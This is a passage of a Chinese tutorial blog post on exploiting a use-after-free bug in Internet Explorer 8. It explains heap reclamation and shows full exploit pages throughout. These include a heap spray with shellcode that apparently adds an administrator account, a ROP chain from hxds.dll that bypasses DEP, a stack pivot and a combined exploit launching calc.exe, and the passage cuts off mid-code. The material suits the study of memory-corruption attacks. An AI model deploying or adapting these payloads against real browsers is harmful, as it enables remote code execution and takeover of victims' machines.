<p>这一步很关键，前面分析了edi为对象指针，在释放后重新使用。这一步我们见改写CButton的dword使他指向自己造的虚表，达到劫持程序流。</p>
<p>这里需要了解为什么会占位成功。</p>
<blockquote>
<p>关于堆分配器有几件事我们需要知道： <br>
  (1)由于内存动态分配和释放，会产生堆碎片； <br>
  (2)堆内存块释放。会由前端或后端分配器回收(依赖操作系统). 分配器类似于缓存服务那样优化内存块分配。像之前提到堆分配和释放产生堆碎片(=bad)，为了较少堆碎片，新分配一块内存时，堆分配器会直接返回之前释放的一块同样大小的内存。从而减少了新分配的次数(=good)； <br>
  (3)虽然堆内存是动态分配，但是分配器往往会连续的分配内存块 (为了减少堆碎片)这意味着从攻击者的角度来看堆是确定的。 连续的分配内存我们就可以在某个可预测的地址上布置我们的数据。</br></br></br></p>
</blockquote>
<p>所以我们要申请一个和以前大小一样的内存空间，前面的内存申请已经很详细了，申请了0x58字节，所以我们这里也要重复申请0x58字节大小的内存。</p>
<pre class="prettyprint"><code class=" hljs cs"> <span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i&lt;<span class="hljs-number">0x550</span>; i++)<span class="hljs-comment">//这里必须根据自己的电脑来配置</span>
 {
     arr_div[i]= document.createElement(<span class="hljs-string">"div"</span>);
     arr_div[i].title= junk.substring(<span class="hljs-number">0</span>,(<span class="hljs-number">0x58</span>-<span class="hljs-number">6</span>)/<span class="hljs-number">2</span>);
 }</code></pre>
<p>发现已经成功占位，<code>eax=1c1c1c1c</code>下一步就是<code>call [eax+0xdc]</code> <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170629113337551?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></br></p>
<p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170629164659123?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></p>
<pre class="prettyprint"><code class=" hljs xml"><span class="hljs-doctype">&lt;!doctype html&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-title">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-title">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-title">script</span>&gt;</span><span class="javascript">
 <span class="hljs-keyword">var</span> arr_div = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Array</span>();
 <span class="hljs-keyword">var</span> junk=<span class="hljs-built_in">unescape</span>(<span class="hljs-string">"%u1c1c%u1c1c"</span>);
 <span class="hljs-keyword">while</span> (junk.length &lt; (<span class="hljs-number">0x100</span>- <span class="hljs-number">6</span>)/<span class="hljs-number">2</span>)
 {
    junk+=junk;
 }
 <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">helloWorld</span><span class="hljs-params">()</span> {</span>
 <span class="hljs-keyword">var</span> e0 = <span class="hljs-literal">null</span>;
 <span class="hljs-keyword">var</span> e1 = <span class="hljs-literal">null</span>;
 <span class="hljs-keyword">var</span> e2 = <span class="hljs-literal">null</span>;
 <span class="hljs-keyword">try</span> {
     e0 = document.getElementById(<span class="hljs-string">"a"</span>);
     e1 = document.getElementById(<span class="hljs-string">"b"</span>);
     e2 = document.createElement(<span class="hljs-string">"q"</span>);
     e1.applyElement(e2);
     e1.appendChild(document.createElement(<span class="hljs-string">'button'</span>));
     e1.applyElement(e0);
     e2.outerText = <span class="hljs-string">""</span>;
     e2.appendChild(document.createElement(<span class="hljs-string">'body'</span>));
 } <span class="hljs-keyword">catch</span>(e) { }
 CollectGarbage();
 <span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i&lt;<span class="hljs-number">0x550</span>; i++)<span class="hljs-comment">//这里必须根据自己的电脑来配置</span>
 {
     arr_div[i]= document.createElement(<span class="hljs-string">"div"</span>);
     arr_div[i].title= junk.substring(<span class="hljs-number">0</span>,(<span class="hljs-number">0x58</span>-<span class="hljs-number">6</span>)/<span class="hljs-number">2</span>);
 }
 }
</span><span class="hljs-tag">&lt;/<span class="hljs-title">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-title">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-title">body</span> <span class="hljs-attribute">onload</span>=<span class="hljs-value">"eval(helloWorld())"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-title">form</span> <span class="hljs-attribute">id</span>=<span class="hljs-value">"a"</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-title">form</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-title">dfn</span> <span class="hljs-attribute">id</span>=<span class="hljs-value">"b"</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-title">dfn</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-title">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-title">html</span>&gt;</span></code></pre>
<p>这里有个问题，经常占位不成功，也不知道为什么。。</p>
<h2 id="0x3-最终shellcode含rop">0x3 最终shellcode（含ROP）</h2>
<p><strong>无DEP：</strong></p>
<p>最后写了一个没有带ROP的shellcode，能够成功劫持程序流，但不能继续执行（因为ie8自带DEP保护，必须用ROP绕过，日后再完善吧）</p>
<p>最后的shellcode执行流程是首先进行堆喷射，其次利用对象占位将刚刚释放的内存改写，接着就是UAF漏洞的执行了，会跳转到0x0c0c0c0c的地方去执行恶意代码</p>
<pre class="prettyprint"><code class=" hljs xml"><span class="hljs-doctype">&lt;!doctype html&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-title">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-title">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-title">script</span>&gt;</span><span class="javascript">
<span class="hljs-comment">//堆喷射</span>
 <span class="hljs-comment">//Fix BSTR spec</span>
 <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">alloc</span><span class="hljs-params">(bytes, mystr)</span> {</span>
 <span class="hljs-keyword">while</span> (mystr.length&lt;bytes) mystr += mystr;
 <span class="hljs-keyword">return</span> mystr.substr(<span class="hljs-number">0</span>, (bytes-<span class="hljs-number">6</span>)/<span class="hljs-number">2</span>);
 }

 block_size = <span class="hljs-number">0x1000</span>;
 padding_size = <span class="hljs-number">0x5FC</span>; <span class="hljs-comment">//offset to 0x0c0c0c0c inside our 0x1000 hex block</span>
 Padding = <span class="hljs-string">''</span>;
 NopSlide = <span class="hljs-string">''</span>;

 <span class="hljs-keyword">var</span> Shellcode =
<span class="hljs-built_in">unescape</span>(<span class="hljs-string">'%ud231%u30b2%u8b64%u8b12%u0c52%u528b%u8b1c%u0842%u728b%u8b20%u8012%u0c7e%u7533%u89f2%u03c7%u3c78%u578b%u0178%u8bc2%u207a%uc701%ued31%u348b%u01af%u45c6%u3e81%u6957%u456e%uf275%u7a8b%u0124%u66c7%u2c8b%u8b6f%u1c7a%uc701%u7c8b%ufcaf%uc701%u4b68%u6e33%u6801%u4220%u6f72%u2f68%u4441%u6844%u726f%u2073%u7468%u6172%u6874%u6e69%u7369%u2068%u6441%u686d%u6f72%u7075%u6368%u6c61%u6867%u2074%u6f6c%u2668%u6e20%u6865%u4444%u2620%u6e68%u2f20%u6841%u6f72%u334b%u3368%u206e%u6842%u7242%u4b6f%u7368%u7265%u6820%u7465%u7520%u2f68%u2063%u686e%u7865%u2065%u6368%u646d%u892e%ufee5%u534d%uc031%u5550%ud7ff'</span>);

 <span class="hljs-keyword">for</span> (p = <span class="hljs-number">0</span>; p &lt; padding_size; p++){
 Padding += <span class="hljs-built_in">unescape</span>(<span class="hljs-string">'%u0c0c'</span>);}

 <span class="hljs-keyword">for</span> (c = <span class="hljs-number">0</span>; c &lt; block_size; c++){
 NopSlide += <span class="hljs-built_in">unescape</span>(<span class="hljs-string">'%u1c1c'</span>);} <span class="hljs-comment">//shellcode hou</span>
 NopSlide = NopSlide.substring(<span class="hljs-number">0</span>,block_size - (Shellcode.length + Padding.length));

 <span class="hljs-keyword">var</span> OBJECT = Padding + Shellcode + NopSlide;
 OBJECT = alloc(<span class="hljs-number">0xfffe0</span>, OBJECT); <span class="hljs-comment">// 0xfffe0 = 1mb</span>

 <span class="hljs-keyword">var</span> evil = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Array</span>();
 <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> k = <span class="hljs-number">0</span>; k &lt; <span class="hljs-number">250</span>; k++) {
 evil[k] = OBJECT.substr(<span class="hljs-number">0</span>, OBJECT.length);
 }
 alert(<span class="hljs-string">'spray done !'</span>);


<span class="hljs-keyword">var</span> arr_div = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Array</span>();
 <span class="hljs-keyword">var</span> junk=<span class="hljs-built_in">unescape</span>(<span class="hljs-string">"%u0c0c%u0c0c"</span>);
 <span class="hljs-keyword">while</span> (junk.length &lt; (<span class="hljs-number">0x100</span>- <span class="hljs-number">6</span>)/<span class="hljs-number">2</span>)
 {
    junk+=junk;
 }
 <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">helloWorld</span><span class="hljs-params">()</span> {</span>
 <span class="hljs-keyword">var</span> e0 = <span class="hljs-literal">null</span>;
 <span class="hljs-keyword">var</span> e1 = <span class="hljs-literal">null</span>;
 <span class="hljs-keyword">var</span> e2 = <span class="hljs-literal">null</span>;
 <span class="hljs-keyword">try</span> {
     e0 = document.getElementById(<span class="hljs-string">"a"</span>);
     e1 = document.getElementById(<span class="hljs-string">"b"</span>);
     e2 = document.createElement(<span class="hljs-string">"q"</span>);
     e1.applyElement(e2);
     e1.appendChild(document.createElement(<span class="hljs-string">'button'</span>));
     e1.applyElement(e0);
     e2.outerText = <span class="hljs-string">""</span>;
     e2.appendChild(document.createElement(<span class="hljs-string">'body'</span>));
 } <span class="hljs-keyword">catch</span>(e) { }
 CollectGarbage();
 <span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i&lt;<span class="hljs-number">0x550</span>; i++)
 {
     arr_div[i]= document.createElement(<span class="hljs-string">"div"</span>);
     arr_div[i].title= junk.substring(<span class="hljs-number">0</span>,(<span class="hljs-number">0x58</span>-<span class="hljs-number">6</span>)/<span class="hljs-number">2</span>);
 }
 }

</span><span class="hljs-tag">&lt;/<span class="hljs-title">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-title">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-title">body</span> <span class="hljs-attribute">onload</span>=<span class="hljs-value">"eval(helloWorld())"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-title">form</span> <span class="hljs-attribute">id</span>=<span class="hljs-value">"a"</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-title">form</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-title">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-title">html</span>&gt;</span></code></pre>
<p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170629180354132?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></p>
<p><strong>有DEP：</strong> <br>
上述情况是在xp情况下 可以实行的应为没有windows的保护机制，而在本实验环境下是不能够实行的，在win7的ie8下有alsr以及dep的保护我们采取的措施是使用未开启alsr 的office2010的hxds.dll以及构造ROP链关闭ie8的数据保护。 <br>
使用<code>location.href = 'ms-help://'</code>可以让ie浏览器自动加载hxds.dll模块（一般情况下ASLR是关掉的） <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170707154747898?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
首先让浏览器加载hxds.dll</br></img></br></br></br></p>
<pre class="prettyprint"><code class=" hljs xml">
 <span class="hljs-doctype">&lt;!DOCTYPE html&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-title">html</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-title">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-title">title</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-title">title</span>&gt;</span>
 <span class="hljs-tag">&lt;/<span class="hljs-title">head</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-title">body</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-title">script</span> <span class="hljs-attribute">type</span>=<span class="hljs-value">"text/javascript"</span>&gt;</span><span class="javascript">
    location.href = <span class="hljs-string">'ms-help://'</span>;
 </span><span class="hljs-tag">&lt;/<span class="hljs-title">script</span>&gt;</span>
 <span class="hljs-tag">&lt;/<span class="hljs-title">body</span>&gt;</span>
 <span class="hljs-tag">&lt;/<span class="hljs-title">html</span>&gt;</span></code></pre>
<p>利用immunity Debugger  的mona插件寻找rop链 <br>
下面给出一种rop链的构造方法</br></p>
<pre class="prettyprint"><code class=" hljs perl">var ropchain =   

<span class="hljs-string">"<span class="hljs-variable">%u34b4</span><span class="hljs-variable">%u51bf</span>"</span> +   <span class="hljs-regexp">//</span>   <span class="hljs-number">0x51bf34b4</span>     <span class="hljs-comment"># POP ESI # RETN [hxds.dll] </span>
<span class="hljs-string">"<span class="hljs-variable">%u10b8</span><span class="hljs-variable">%u51bd</span>"</span> +   <span class="hljs-regexp">//</span>   <span class="hljs-number">0x51bd10b8</span>     <span class="hljs-comment"># ptr to &amp;VirtualProtect() [IAT hxds.dll]</span>
<span class="hljs-string">"<span class="hljs-variable">%u2d97</span><span class="hljs-variable">%u51bd</span>"</span> +   <span class="hljs-regexp">//</span>   <span class="hljs-number">0x51bd2d97</span>     <span class="hljs-comment"># MOV EAX,DWORD PTR DS:[ESI] # RETN [hxds.dll] </span>
<span class="hljs-string">"<span class="hljs-variable">%ucba0</span><span class="hljs-variable">%u51bd</span>"</span> +   <span class="hljs-regexp">//</span>   <span class="hljs-number">0x51bdcba0</span>     <span class="hljs-comment"># XCHG EAX,ESI # RETN 00 [hxds.dll] </span>
<span class="hljs-string">"<span class="hljs-variable">%u79e2</span><span class="hljs-variable">%u51c3</span>"</span> +   <span class="hljs-regexp">//</span>   <span class="hljs-number">0x51c379e2</span>     <span class="hljs-comment"># POP EBP # RETN [hxds.dll] </span>
<span class="hljs-string">"<span class="hljs-variable">%u9683</span><span class="hljs-variable">%u51c5</span>"</span> +   <span class="hljs-regexp">//</span>   <span class="hljs-number">0x51c59683</span>     <span class="hljs-comment"># &amp; call esp [hxds.dll]</span>
<span class="hljs-string">"<span class="hljs-variable">%u6fbd</span><span class="hljs-variable">%u51c5</span>"</span> +   <span class="hljs-regexp">//</span>   <span class="hljs-number">0x51c56fbd</span>     <span class="hljs-comment"># POP EAX # RETN [hxds.dll] </span>
<span class="hljs-string">"<span class="hljs-variable">%ufdfe</span><span class="hljs-variable">%ua17f</span>"</span> +   <span class="hljs-regexp">//</span>   <span class="hljs-number">0xa17ffdfe</span>     <span class="hljs-comment"># put delta into eax (-&gt; put 0x00000201 into ebx)</span>
<span class="hljs-string">"<span class="hljs-variable">%u1e01</span><span class="hljs-variable">%u51c1</span>"</span> +   <span class="hljs-regexp">//</span>   <span class="hljs-number">0x51C11E01</span>     <span class="hljs-comment"># ADD EAX,5E800403 # RETN [hxds.dll] </span>
<span class="hljs-string">"<span class="hljs-variable">%u92d8</span><span class="hljs-variable">%u51c3</span>"</span> +   <span class="hljs-regexp">//</span>   <span class="hljs-number">0x51C392D8</span>     <span class="hljs-comment"># XCHG EAX,EBX # RETN [hxds.dll]</span>
<span class="hljs-string">"<span class="hljs-variable">%ue67d</span><span class="hljs-variable">%u51bf</span>"</span> +   <span class="hljs-regexp">//</span>   <span class="hljs-number">0x51BFE67D</span>     <span class="hljs-comment"># XOR EAX,EAX # RETN [hxds.dll] </span>
<span class="hljs-string">"<span class="hljs-variable">%u6fbd</span><span class="hljs-variable">%u51c5</span>"</span> +   <span class="hljs-regexp">//</span>   <span class="hljs-number">0x51c56fbd</span>     <span class="hljs-comment"># POP EAX # RETN [hxds.dll] </span>
<span class="hljs-string">"<span class="hljs-variable">%ufc3d</span><span class="hljs-variable">%ua17f</span>"</span> +   <span class="hljs-regexp">//</span>   <span class="hljs-number">0xa17ffc3d</span>     <span class="hljs-comment"># put delta into eax (-&gt; put 0x00000040 into edx)</span>
<span class="hljs-string">"<span class="hljs-variable">%u1e01</span><span class="hljs-variable">%u51c1</span>"</span> +   <span class="hljs-regexp">//</span>   <span class="hljs-number">0x51C11E01</span>     <span class="hljs-comment"># ADD EAX,5E800403 # RETN [hxds.dll] </span>
<span class="hljs-string">"<span class="hljs-variable">%u592b</span><span class="hljs-variable">%u51bf</span>"</span> +   <span class="hljs-regexp">//</span>   <span class="hljs-number">0x51BF592B</span>     <span class="hljs-comment"># XCHG EAX,EDX # RETN [hxds.dll] </span>
<span class="hljs-string">"<span class="hljs-variable">%ucf3e</span><span class="hljs-variable">%u51be</span>"</span> +   <span class="hljs-regexp">//</span>   <span class="hljs-number">0x51becf3e</span>     <span class="hljs-comment"># POP ECX # RETN [hxds.dll] </span>
<span class="hljs-string">"<span class="hljs-variable">%ud150</span><span class="hljs-variable">%u51c5</span>"</span> +   <span class="hljs-regexp">//</span>   <span class="hljs-number">0x51c5d150</span>     <span class="hljs-comment"># &amp;Writable location [hxds.dll]</span>
<span class="hljs-string">"<span class="hljs-variable">%uf563</span><span class="hljs-variable">%u51be</span>"</span> +   <span class="hljs-regexp">//</span>   <span class="hljs-number">0x51bef563</span>     <span class="hljs-comment"># POP EDI # RETN [hxds.dll] </span>
<span class="hljs-string">"<span class="hljs-variable">%u7402</span><span class="hljs-variable">%u51c0</span>"</span> +   <span class="hljs-regexp">//</span>   <span class="hljs-number">0x51c07402</span>     <span class="hljs-comment"># RETN (ROP NOP) [hxds.dll]</span>
<span class="hljs-string">"<span class="hljs-variable">%u6fbd</span><span class="hljs-variable">%u51c5</span>"</span> +   <span class="hljs-regexp">//</span>   <span class="hljs-number">0x51c56fbd</span>     <span class="hljs-comment"># POP EAX # RETN [hxds.dll] </span>
<span class="hljs-string">"<span class="hljs-variable">%u9090</span><span class="hljs-variable">%u9090</span>"</span> +   <span class="hljs-regexp">//</span>    <span class="hljs-number">0x90909090</span>     <span class="hljs-comment"># nop</span>
<span class="hljs-string">"<span class="hljs-variable">%ua8dc</span><span class="hljs-variable">%u51bd</span>"</span>;    <span class="hljs-regexp">//</span>   <span class="hljs-number">0x51BDA8DC</span>     <span class="hljs-comment"># PUSHAD # POP ECX # RETN [hxds.dll]</span></code></pre>
<p>有了rop了链以及精准堆喷射,现在只需要stack pivot就OK了 <br>
同样我们使用hxds.dll中的rop构造栈翻转</br></p>
<pre class="prettyprint"><code class=" hljs perl">var stackpivot += <span class="hljs-string">"<span class="hljs-variable">%ub30e</span><span class="hljs-variable">%u51c3</span>"</span>; <span class="hljs-regexp">//</span> <span class="hljs-number">0x51c3b30e</span>  <span class="hljs-comment"># RETN  [hxds.dll] (align esp)</span>
stackpivot += <span class="hljs-string">"<span class="hljs-variable">%u198c</span><span class="hljs-variable">%u51be</span>"</span>; <span class="hljs-regexp">//</span> <span class="hljs-number">0x51be198c</span>  <span class="hljs-comment"># POP EBX # RETN [hxds.dll] </span>
stackpivot += <span class="hljs-string">"<span class="hljs-variable">%u4a41</span><span class="hljs-variable">%u51be</span>"</span>; <span class="hljs-regexp">//</span> <span class="hljs-number">0x51be4a41</span>  <span class="hljs-comment"># XCHG EAX,ESP # RETN  [hxds.dll]</span></code></pre>
<p>第一次执行第三行的XCHG代码使得栈翻转到堆上第一行的位置，执行第二行的时候正好将XCHG POP进ebx中去 避免了第二次翻转</p>
<p>下面是完整代码</p>
<pre class="prettyprint"><code class=" hljs perl">&lt;!doctype html&gt;
&lt;html&gt;
&lt;head&gt;
&lt;script&gt;
    var arr_div = new Array();
    var junk=unescape(<span class="hljs-string">"<span class="hljs-variable">%u0b30</span><span class="hljs-variable">%u0c0c</span>"</span>);
    <span class="hljs-keyword">while</span> (junk.<span class="hljs-keyword">length</span> &lt; (<span class="hljs-number">0x100</span>- <span class="hljs-number">6</span>)/<span class="hljs-number">2</span>)
    {
     junk+=junk;
    }
    var nops=unescape(<span class="hljs-string">"<span class="hljs-variable">%u9090</span><span class="hljs-variable">%u9090</span>"</span>);
    <span class="hljs-keyword">while</span>(nops.<span class="hljs-keyword">length</span>&lt;<span class="hljs-number">0x400</span>) nops+=nops;
    <span class="hljs-keyword">while</span>(nops.<span class="hljs-keyword">length</span>&lt;<span class="hljs-number">0x5f2</span>) nops+=unescape(<span class="hljs-string">"<span class="hljs-variable">%ub30e</span><span class="hljs-variable">%u51c3</span>"</span>);
    nops+=unescape(<span class="hljs-string">"<span class="hljs-variable">%u198c</span><span class="hljs-variable">%u51be</span>"</span>);
    var code =unescape(
     <span class="hljs-string">"<span class="hljs-variable">%u4a41</span><span class="hljs-variable">%u51be</span><span class="hljs-variable">%u34b4</span><span class="hljs-variable">%u51bf</span><span class="hljs-variable">%u10b8</span><span class="hljs-variable">%u51bd</span><span class="hljs-variable">%u2d97</span><span class="hljs-variable">%u51bd</span><span class="hljs-variable">%ucba0</span><span class="hljs-variable">%u51bd</span>"</span>+
     <span class="hljs-string">"<span class="hljs-variable">%u79e2</span><span class="hljs-variable">%u51c3</span><span class="hljs-variable">%u9683</span><span class="hljs-variable">%u51c5</span><span class="hljs-variable">%u6fbd</span><span class="hljs-variable">%u51c5</span><span class="hljs-variable">%ufffe</span><span class="hljs-variable">%ua17f</span>"</span>+
     <span class="hljs-string">"<span class="hljs-variable">%u1e01</span><span class="hljs-variable">%u51c1</span><span class="hljs-variable">%u92d8</span><span class="hljs-variable">%u51c3</span><span class="hljs-variable">%ue67d</span><span class="hljs-variable">%u51bf</span><span class="hljs-variable">%u6fbd</span><span class="hljs-variable">%u51c5</span>"</span>+
     <span class="hljs-string">"<span class="hljs-variable">%ufc3d</span><span class="hljs-variable">%ua17f</span><span class="hljs-variable">%u1e01</span><span class="hljs-variable">%u51c1</span><span class="hljs-variable">%u592b</span><span class="hljs-variable">%u51bf</span><span class="hljs-variable">%ucf3e</span><span class="hljs-variable">%u51be</span>"</span>+
     <span class="hljs-string">"<span class="hljs-variable">%ud150</span><span class="hljs-variable">%u51c5</span><span class="hljs-variable">%uf563</span><span class="hljs-variable">%u51be</span><span class="hljs-variable">%u7402</span><span class="hljs-variable">%u51c0</span><span class="hljs-variable">%u6fbd</span><span class="hljs-variable">%u51c5</span>"</span>+
     <span class="hljs-string">"<span class="hljs-variable">%u9090</span><span class="hljs-variable">%u9090</span><span class="hljs-variable">%ua8dc</span><span class="hljs-variable">%u51bd</span>"</span>+                                        <span class="hljs-regexp">//</span>ROP结束
     <span class="hljs-string">"<span class="hljs-variable">%uc481</span><span class="hljs-variable">%uf254</span><span class="hljs-variable">%uffff</span><span class="hljs-variable">%u2ebf</span><span class="hljs-variable">%ue4ed</span><span class="hljs-variable">%udbc0</span><span class="hljs-variable">%ud9c8</span><span class="hljs-variable">%u2474</span>"</span> +               <span class="hljs-regexp">//shellcode</span> calc.exe
     <span class="hljs-string">"<span class="hljs-variable">%u58f4</span><span class="hljs-variable">%uc933</span><span class="hljs-variable">%u33b1</span><span class="hljs-variable">%u7831</span><span class="hljs-variable">%u0312</span><span class="hljs-variable">%u1278</span><span class="hljs-variable">%uee83</span><span class="hljs-variable">%u06e9</span>"</span> +
     <span class="hljs-string">"<span class="hljs-variable">%u1235</span><span class="hljs-variable">%u4f19</span><span class="hljs-variable">%ueab6</span><span class="hljs-variable">%u30da</span><span class="hljs-variable">%u0f3e</span><span class="hljs-variable">%u62eb</span><span class="hljs-variable">%u4424</span><span class="hljs-variable">%ub35e</span>"</span> +
     <span class="hljs-string">"<span class="hljs-variable">%u082e</span><span class="hljs-variable">%u3853</span><span class="hljs-variable">%ub862</span><span class="hljs-variable">%u4ce0</span><span class="hljs-variable">%ucfab</span><span class="hljs-variable">%ufa41</span><span class="hljs-variable">%ufe8d</span><span class="hljs-variable">%uca52</span>"</span> +
     <span class="hljs-string">"<span class="hljs-variable">%uac11</span><span class="hljs-variable">%u4c91</span><span class="hljs-variable">%uaeee</span><span class="hljs-variable">%uaec5</span><span class="hljs-variable">%u61cf</span><span class="hljs-variable">%uae18</span><span class="hljs-variable">%u9f08</span><span class="hljs-variable">%ue2d3</span>"</span> +
     <span class="hljs-string">"<span class="hljs-variable">%ud4c1</span><span class="hljs-variable">%u1346</span><span class="hljs-variable">%ua865</span><span class="hljs-variable">%u125a</span><span class="hljs-variable">%ua7a9</span><span class="hljs-variable">%u6ce3</span><span class="hljs-variable">%u77cc</span><span class="hljs-variable">%uc697</span>"</span> +a
     <span class="hljs-string">"<span class="hljs-variable">%ua7cf</span><span class="hljs-variable">%u5c08</span><span class="hljs-variable">%u5f87</span><span class="hljs-variable">%u3a22</span><span class="hljs-variable">%u5e38</span><span class="hljs-variable">%u58e7</span><span class="hljs-variable">%u2904</span><span class="hljs-variable">%uab8c</span>"</span> +
     <span class="hljs-string">"<span class="hljs-variable">%ua8fe</span><span class="hljs-variable">%ue244</span><span class="hljs-variable">%u9bff</span><span class="hljs-variable">%ua9a8</span><span class="hljs-variable">%u14c1</span><span class="hljs-variable">%ub325</span><span class="hljs-variable">%u9206</span><span class="hljs-variable">%uc6d6</span>"</span> +
     <span class="hljs-string">"<span class="hljs-variable">%ue17c</span><span class="hljs-variable">%ud16b</span><span class="hljs-variable">%u9846</span><span class="hljs-variable">%u54b7</span><span class="hljs-variable">%u3a5b</span><span class="hljs-variable">%uce33</span><span class="hljs-variable">%ubbbf</span><span class="hljs-variable">%u8990</span>"</span> +
     <span class="hljs-string">"<span class="hljs-variable">%ub734</span><span class="hljs-variable">%udd5d</span><span class="hljs-variable">%udb13</span><span class="hljs-variable">%u3260</span><span class="hljs-variable">%ue728</span><span class="hljs-variable">%ub5e9</span><span class="hljs-variable">%u6eff</span><span class="hljs-variable">%u91a9</span>"</span> +
     <span class="hljs-string">"<span class="hljs-variable">%u2bdb</span><span class="hljs-variable">%ubb69</span><span class="hljs-variable">%u917a</span><span class="hljs-variable">%uc4dc</span><span class="hljs-variable">%u7d9d</span><span class="hljs-variable">%u6080</span><span class="hljs-variable">%u6fd5</span><span class="hljs-variable">%u13d5</span>"</span> +
     <span class="hljs-string">"<span class="hljs-variable">%ue5b4</span><span class="hljs-variable">%u9128</span><span class="hljs-variable">%u40c2</span><span class="hljs-variable">%ua92a</span><span class="hljs-variable">%ue2cc</span><span class="hljs-variable">%u9843</span><span class="hljs-variable">%u6d47</span><span class="hljs-variable">%u2513</span>"</span> +
     <span class="hljs-string">"<span class="hljs-variable">%uca82</span><span class="hljs-variable">%u6feb</span><span class="hljs-variable">%u7a8f</span><span class="hljs-variable">%u3664</span><span class="hljs-variable">%u3f45</span><span class="hljs-variable">%uc9e9</span><span class="hljs-variable">%u03b3</span><span class="hljs-variable">%u4a14</span>"</span> +
     <span class="hljs-string">"<span class="hljs-variable">%ufb36</span><span class="hljs-variable">%u52e3</span><span class="hljs-variable">%ufe33</span><span class="hljs-variable">%ud4a8</span><span class="hljs-variable">%u72af</span><span class="hljs-variable">%ub0a0</span><span class="hljs-variable">%u21cf</span><span class="hljs-variable">%u90c1</span>"</span> +
     <span class="hljs-string">"<span class="hljs-variable">%ua4b3</span><span class="hljs-variable">%u7851</span><span class="hljs-variable">%u431a</span><span class="hljs-variable">%u1bd2</span><span class="hljs-variable">%u4162</span>"</span>);
    var offset=<span class="hljs-number">0x5F4</span>;
    var junk_offset=nops.substring(<span class="hljs-number">0</span>,<span class="hljs-number">0x5F4</span>);
    var shellcode=junk_offset+code+nops.substring(<span class="hljs-number">0</span>,<span class="hljs-number">0x800</span>-<span class="hljs-number">0x5F4</span>-code.<span class="hljs-keyword">length</span>);
    <span class="hljs-keyword">while</span>(shellcode.<span class="hljs-keyword">length</span>&lt;<span class="hljs-number">0x40000</span>)
    {
        shellcode+=shellcode;
    }
    var block = shellcode.substring(<span class="hljs-number">0</span>,<span class="hljs-number">0x40000</span>);
    var heap_chunks = new Array();
    <span class="hljs-keyword">for</span> (var i=<span class="hljs-number">1</span>; i &lt; <span class="hljs-number">0x700</span>; i++) 
        heap_chunks[i] = block.substring(<span class="hljs-number">0</span>,<span class="hljs-number">0x40000</span>);
    <span class="hljs-regexp">//location</span>.href = <span class="hljs-string">'ms-help://'</span>;
    function helloWorld() 
    {
    <span class="hljs-regexp">//alert</span>(<span class="hljs-number">1</span>);
          var e<span class="hljs-number">0</span> = null;
          var e1 = null;
          var e2 = null;

          try 
          {
               e<span class="hljs-number">0</span> = document.getElementById(<span class="hljs-string">"a"</span>);
               e1 = document.getElementById(<span class="hljs-string">"b"</span>);
               e2 = document.createElement(<span class="hljs-string">"q"</span>);
               e1.applyElement(e2);
               e1.appendChild(document.createElement(<span class="hljs-string">'button'</span>));
               e1.applyElement(e<span class="hljs-number">0</span>);
               e2.outerText = <span class="hljs-string">""</span>;
               e2.appendChild(document.createElement(<span class="hljs-string">'body'</span>));
          } catch(e) { }
          CollectGarbage();
           <span class="hljs-keyword">for</span>(var i = <span class="hljs-number">0</span>; i&lt;<span class="hljs-number">0x50</span>; i++)
          {
